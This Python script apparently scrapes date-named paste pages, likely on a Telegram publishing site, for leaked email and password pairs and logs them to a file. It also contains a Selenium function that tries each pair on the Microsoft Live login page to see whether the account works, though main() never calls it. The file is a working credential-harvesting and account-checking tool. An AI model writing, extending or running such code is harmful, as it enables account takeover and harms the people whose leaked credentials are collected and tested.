from bs4 import BeautifulSoup
from datetime import datetime
from calendar import monthrange
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import requests
import os
import re
import yaml
import time

option = webdriver.ChromeOptions()
option.add_argument("start-maximized")

def MicrosoftCheck(data : list[str]) -> bool:
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=option)
    driver.get('https://login.live.com/ppsecure/secure.srf')
    time.sleep(2)
    login = driver.find_element(By.ID,'i0116').send_keys(data[0])
    time.sleep(1)
    loginButton = driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
    time.sleep(1)
    code = driver.find_element(By.ID,'i0118').send_keys(data[1])
    time.sleep(1)
    codeButton = driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
    time.sleep(1)
    try:
        if driver.find_element(By.ID,'i0118Error') or driver.find_element(By.ID,'idTD_Error') or driver.find_element(By.ID,'iSelectProofTitle'):
            return False
    except Exception:
        return True
    driver.close()


launchTime = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")

logFile = open(f"{launchTime}.txt", 'w+')

with open("settings.yml") as s: settings = yaml.safe_load(s)
websites = settings["websites_list"]

offset = settings["offset"]
offsetBool = offset["offset"]
offsetValue = offset["value"]

releaseDate = settings["release_date"]
releaseDateBool = releaseDate["release_date"]
releaseDateYears = releaseDate["years"]

s.close()

def progressBar(current : int, total : int):
    percent = 100 * current/total
    print(f"\r{round(percent)*'█'+(100-round(percent))*'#'} [{round(percent,1)}%]", end='\r')

def parse(url : str):
    page = requests.get(url)
    if page.status_code != 404:
        soup = BeautifulSoup(page.text, "html.parser")
        release_date = int(soup.select_one("time").get_text('\n', strip=True)[-4:])
        if not releaseDateBool or release_date in releaseDateYears:
            text = [i for i in soup.stripped_strings]
            for i in range(len(text)):
                login = re.findall(r"\S+@\S+\.\S+", text[i])
                if login and login != ["dmca@telegram.org"]:
                    if len(text[i+1]) < 14: password = text[i+2]
                    else: password = text[i+1].split()[-1]
                    logFile.write('\n'.join([url, *login, password, '\n'])); logFile.flush()

def main():
    counter = 1
    for month in range(1, 13):
        for day in range(1, monthrange(2020, month)[1]+1):
            websitesList = [url+f"-{month:02}-{day:02}" for url in websites]
            if offsetBool:
                for i in range(len(websites)):
                    for k in range(2, offsetValue+1):
                        websitesList.append([url+f"-{month:02}-{day:02}-{k}" for url in websites][i])
            for url in websitesList: parse(url)
            progressBar(counter, 366)
            counter += 1

    logFile.close()
    os.rename(f"{launchTime}.txt", f"{launchTime}_complete.txt")
    print(f"\nSuccessfull complete! >> {launchTime}_complete.txt")

if __name__ == "__main__":
    main()